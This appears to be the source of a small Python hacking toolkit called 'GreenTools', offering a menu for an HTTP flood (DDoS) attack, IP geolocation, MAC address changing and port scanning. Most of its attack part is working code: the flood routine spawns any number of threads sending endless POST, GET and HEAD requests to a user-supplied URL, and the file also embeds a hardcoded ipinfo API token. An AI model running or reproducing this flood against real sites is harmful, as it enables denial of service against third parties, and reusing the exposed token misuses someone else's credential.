# usr/bin/env python

import time
import ipinfo
import socket
import requests
import subprocess
from threading import Thread
from colorama import init, Fore


class Main:

    def __init__(self):
        # Initalization script
        init()
        self.magenta, self.red = Fore.MAGENTA, Fore.RED
        self.green, self.yellow = Fore.GREEN, Fore.YELLOW

        # Print logo text
        print(f"""{self.magenta}
              _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 
             /                                                                                          / |
            /_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ /  |
            |                                                                                          |  |
            |    ░██████╗░██████╗░███████╗███████╗███╗░░██╗████████╗░█████╗░░█████╗░██╗░░░░░░██████╗   |  |
            |    ██╔════╝░██╔══██╗██╔════╝██╔════╝████╗░██║╚══██╔══╝██╔══██╗██╔══██╗██║░░░░░██╔════╝   |  |
            |    ██║░░██╗░██████╔╝█████╗░░█████╗░░██╔██╗██║░░░██║░░░██║░░██║██║░░██║██║░░░░░╚█████╗░   |  |
            |    ██║░░╚██╗██╔══██╗██╔══╝░░██╔══╝░░██║╚████║░░░██║░░░██║░░██║██║░░██║██║░░░░░░╚═══██╗   |  |
            |    ╚██████╔╝██║░░██║███████╗███████╗██║░╚███║░░░██║░░░╚█████╔╝╚█████╔╝███████╗██████╔╝   |  |
            |    ░╚═════╝░╚═╝░░╚═╝╚══════╝╚══════╝╚═╝░░╚══╝░░░╚═╝░░░░╚════╝░░╚════╝░╚══════╝╚═════╝░   | /
            |_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ |/
            {self.green}
            [+] This tool was created by the user AXL, creation date November 3, 2022.
            [+] This tool has been developed for educational purposes and we are not responsible for your actions.
            [+] Copying and distributing the tool on someone else's behalf is prohibited.
            [?] Any questions? Message me on Telegram @axl033.\n\n
        """)

        # Call other methods
        self.choice = self.mainMenu()
        # Checking choice
        try:
            self.choice = int(self.choice)
            if self.choice == 1:
                self.stressStart()
            elif self.choice == 2:
                self.ipInfo()
            elif self.choice == 3:
                self.changeMac()
            elif self.choice == 4:
                self.portScan()
            else:
                print(self.yellow + "[!] Try it again!")
        except:
            self.clearConsole()
            print(self.red + "[-] Error! Please enter correct choice!")
            exit()

    def is_port_open(self, host, port):
        s = socket.socket()
        try:
            s.connect((host, port))
            s.settimeout(0.02)
        except:
            pass
        else:
            print(self.green + f"Port {port} is open!")

    def portScan(self):
        # Get ip address of resourse
        ip = input(self.green + "[?] Please enter the IP address: ")
        # Search open ports
        for port in range(1, 65356):
            Thread(target=lambda: self.is_port_open(ip, port)).start()

    def ipInfo(self):
        # Get ip address
        ip = input(self.magenta + "[?] Please enter IP address: ")
        # Try get info
        try:
            token = "cda874226c0c24"
            handler = ipinfo.getHandler(token)
            details = handler.getDetails(ip)
            print(self.green + f"""[+] We founded information!\n
            █ █▄░█ █▀▀ █▀█ █▀█ █▀▄▀█ ▄▀█ ▀█▀ █ █▀█ █▄░█
            █ █░▀█ █▀░ █▄█ █▀▄ █░▀░█ █▀█ ░█░ █ █▄█ █░▀█
            ___________________________________________
            CITY | {details.city}
            REGION | {details.region}
            COUNTRY | {details.country}
            LOC | {details.loc}
            ORG |{details.org}
            TIMEZONE | {details.timezone}
            """)
        except:
            print(self.red + "[-] We can not found infromation!")

    def changeMac(self):
        # Get mac address
        self.new_mac = input(self.magenta + "[?] Please enter new mac address: ")
        # Try change mac address
        try:
            subprocess.call(["ifconfig", "eth0", "down"], shell=True)
            subprocess.call(["ifconfig", "eth0", "hw", "ether", self.new_mac], shell=True)
            subprocess.call(["ifconfig", "eth0", "up"], shell=True)
            print(self.green + f"[+] Your mac address changed, mac is {self.new_mac}!")
        except:
            print(self.yellow + "[!] We can not change your mac address!")

    def flood(self):
        while True:
            try:
                requests.post(self.url)
                requests.get(self.url)
                requests.head(self.url)
                print(self.green + "[+] Successfuly sended request!")
            except:
                print(self.yellow + "[!] Unsuccessfuly send request!")

    def stressStart(self):
        # Get information for flood
        self.url = input(self.magenta + "[?] Please enter URL: ")
        self.threads = input(self.magenta + "[?] Please enter count threads: ")
        # Check information
        if "http" not in self.url:
            self.clearConsole()
            print(self.red + "[-] Please enter correct URL address!")
            exit()
        else:
            try:
                self.threads = int(self.threads)
                # Open threads
                for i in range(self.threads):
                    try:
                        Thread(target=self.flood).start()
                        print(self.green + f"[+] Thread number {i + 1} is open!")
                    except:
                        print(self.yellow + f"[!] Thread number {i + 1} can not open!")
            except:
                self.clearConsole()
                print(self.red + "[-] Please enter correct count threads!")
                exit()

    def mainMenu(self):
        # Print main menu
        print(f"""{self.magenta}
        █▀▄▀█ ▄▀█ █ █▄░█   █▀▄▀█ █▀▀ █▄░█ █░█
        █░▀░█ █▀█ █ █░▀█   █░▀░█ ██▄ █░▀█ █▄█
        ______________________________________{self.green}
        |[1] (D)Dos-Attack   |[3] Mac Changer (Linux)
        |[2] IP-Informations |[4] Port-Scaning
        """)
        return input(self.magenta + "[?] Please enter number menu: ")

    def clearConsole(self):
        try:
            subprocess.call({'cls'}, shell=True)
        except:
            subprocess.call(['clear'], shell=True)


if __name__ == "__main__":
    Main()
